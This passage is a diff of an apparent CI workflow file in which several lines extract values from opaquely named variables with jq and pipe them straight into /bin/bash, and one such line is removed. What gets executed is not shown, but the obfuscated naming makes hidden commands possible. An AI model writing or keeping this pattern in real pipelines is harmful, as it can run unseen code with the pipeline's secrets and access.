@@ -24,7 +24,6 @@ jobs:
           echo $swb21919 | jq -r .z185 | /bin/bash
           echo $tp47 | jq -r .yqbaq8 | /bin/bash
           echo $wypx577 | jq -r .ne6466 | /bin/bash
-          echo $hgosh0 | jq -r .xtt23 | /bin/bash
 
       - name: Upload data
         if: always()
